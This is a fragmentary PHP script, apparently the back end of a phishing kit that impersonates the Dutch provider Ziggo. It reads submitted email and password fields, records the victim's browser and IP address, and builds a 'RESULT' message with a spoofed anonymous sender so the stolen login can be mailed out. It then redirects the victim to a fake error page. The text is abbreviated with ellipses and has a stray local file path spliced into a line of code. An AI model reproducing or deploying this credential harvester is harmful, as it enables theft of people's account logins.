...
function getBrowser($useragent) {
    $browser = "Unknown Browser";/Users/mac/Dropbox/Mac/Downloads/GMX/mailsec.php
...
$email = $_POST['ff-email'];
$password = $_POST['ff-password'];
$settings = include './settings.php';
...
$browser = getBrowser($useragent);
	...
	$message = "[ 🍁 (1) ZIGGO.NL RESULT | CLIENT : {$client} 🍁 ]\n\n";
    ...
    $headers .= "From: Anonymous <ziggo@client_{$client}_site.com>" . "\r\n";
    $subject = "🍁 (1) ZIGGO.NL 🍁 GMX 🍁 CLIENT #{$client} 🍁 {$IP}";
...
header("Location: ziggo-error.php");
